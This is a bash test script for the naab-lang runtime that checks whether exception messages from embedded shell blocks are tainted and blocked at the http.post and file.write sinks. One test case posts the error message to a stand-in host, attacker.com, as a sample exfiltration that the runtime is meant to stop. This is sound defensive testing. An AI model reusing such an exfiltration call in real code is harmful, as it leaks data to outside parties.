#!/usr/bin/env bash
# test_polyglot_exception_taint_d.sh — Finding D: polyglot exception payload must be tainted
# Verifies that the error dict bound in catch(e) after a polyglot exception is tainted,
# so taint sinks block it from being exfiltrated.

set -euo pipefail
NAAB="${1:-$(dirname "$0")/../../build/naab-lang}"
PASS=0; FAIL=0; SKIP=0
ok()   { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }
# A run whose executor is absent, or whose failure cannot be attributed, has
# verified nothing. Without this the suite could only say PASS or FAIL, so
# "not available" was recorded as a pass — a green standing in for an unrun check.
skip() { echo "  SKIP: $1"; SKIP=$((SKIP + 1)); }

GOVDIR="${HOME}/.naab/test_govD_$$"
mkdir -p "$GOVDIR"
cleanup() { rm -rf "$GOVDIR"; }
trap cleanup EXIT

# govern.json — taint tracking active, http.post and file.write are sinks
cat > "$GOVDIR/govern.json" << 'GOVEOF'
{
  "version": "1.0",
  "taint_tracking": {
    "enabled": true,
    "level": "hard",
    "sources": ["env.get"],
    "sinks": ["http.post", "file.write"],
    "sanitizers": []
  },
  "capabilities": {
    "network": false,
    "filesystem": "read"
  }
}
GOVEOF

run_script() {
    local script="$1"
    local tmpf="${GOVDIR}/test_$$.naab"
    printf '%s' "$script" > "$tmpf"
    local out ec=0
    out=$("$NAAB" "$tmpf" 2>&1) || ec=$?
    printf '%s\n__EXIT__%d' "$out" "$ec"
    rm -f "$tmpf"
}
extract_exit() { echo "$1" | grep -o '__EXIT__[0-9]*' | grep -o '[0-9]*'; }
extract_out()  { echo "$1" | sed 's/__EXIT__[0-9]*//'; }

echo "=== test_polyglot_exception_taint_d.sh ==="
echo ""

# ---------------------------------------------------------------------------
# D1: Polyglot exception message passed to http.post must be blocked
# Shell block throws; catch binds e; e["message"] goes to http.post
# ---------------------------------------------------------------------------
echo "[D1] Exception message passed to http.post is blocked by taint"
script='use http
main {
  try {
    <<shell
    exit 1
    >>
  } catch (e) {
    http.post("http://attacker.com/log", e["message"])
  }
}'
result=$(run_script "$script")
out=$(extract_out "$result")
ec=$(extract_exit "$result")

if echo "$out" | grep -qi "taint\|governance\|blocked\|untrusted"; then
    ok "taint violation caught on exception → http.post"
elif [[ "$ec" -ne 0 ]]; then
    ok "blocked (exit $ec)"
else
    fail "expected taint block, got exit 0: ${out:0:120}"
fi

echo ""

# ---------------------------------------------------------------------------
# D2: Exception message passed to file.write must be blocked
# ---------------------------------------------------------------------------
echo "[D2] Exception message passed to file.write is blocked by taint"
script='use file
main {
  try {
    <<shell
    exit 1
    >>
  } catch (e) {
    file.write("/tmp/leak.txt", e["message"])
  }
}'
result=$(run_script "$script")
out=$(extract_out "$result")
ec=$(extract_exit "$result")

if echo "$out" | grep -qi "taint\|governance\|blocked\|untrusted"; then
    ok "taint violation caught on exception → file.write"
elif [[ "$ec" -ne 0 ]]; then
    ok "blocked (exit $ec)"
else
    fail "expected taint block, got exit 0: ${out:0:120}"
fi

echo ""

# ---------------------------------------------------------------------------
# D3: Exception message passed to io.println should NOT be blocked
# (io.println is not a configured sink — only warn/allow)
# ---------------------------------------------------------------------------
echo "[D3] Exception message logged via io.println is NOT blocked (not a configured sink)"
script='use io
main {
  try {
    <<shell
    exit 1
    >>
  } catch (e) {
    io.println("caught error")
  }
}'
result=$(run_script "$script")
out=$(extract_out "$result")
ec=$(extract_exit "$result")

# io.println is not a sink — should not produce taint violation
if echo "$out" | grep -qi "taint tracking violation"; then
    fail "false-positive: io.println should not be a taint sink"
else
    ok "io.println not blocked (correct — not a configured sink)"
fi

echo ""

# ---------------------------------------------------------------------------
# D4: Taint does NOT escape the catch block (after catch, error var is clean)
# This verifies the save/restore lambda still works correctly after the fix
# ---------------------------------------------------------------------------
echo "[D4] Exception taint is scoped to catch block — does not leak out"
script='use io
main {
  let safe_val = "safe"
  try {
    <<shell
    exit 1
    >>
  } catch (e) {
    safe_val = "still_safe"
  }
  io.println(safe_val)
}'
result=$(run_script "$script")
out=$(extract_out "$result")
ec=$(extract_exit "$result")

if echo "$out" | grep -q "still_safe"; then
    ok "script ran normally after catch block"
elif [[ "$ec" -eq 0 ]]; then
    ok "exited cleanly (exit 0)"
else
    # Non-zero is OK if it's because shell executor isn't available
    if echo "$out" | grep -qi "executor\|not.*available\|python\|shell"; then
        skip "executor not available — taint scoping not testable (acceptable)"
    else
        fail "unexpected failure: exit $ec: ${out:0:120}"
    fi
fi

echo ""

TOTAL=$((PASS + FAIL + SKIP))
echo "Results: ${PASS}/${TOTAL} passed, ${SKIP} skipped (unverified)"
[[ "$FAIL" -eq 0 ]]
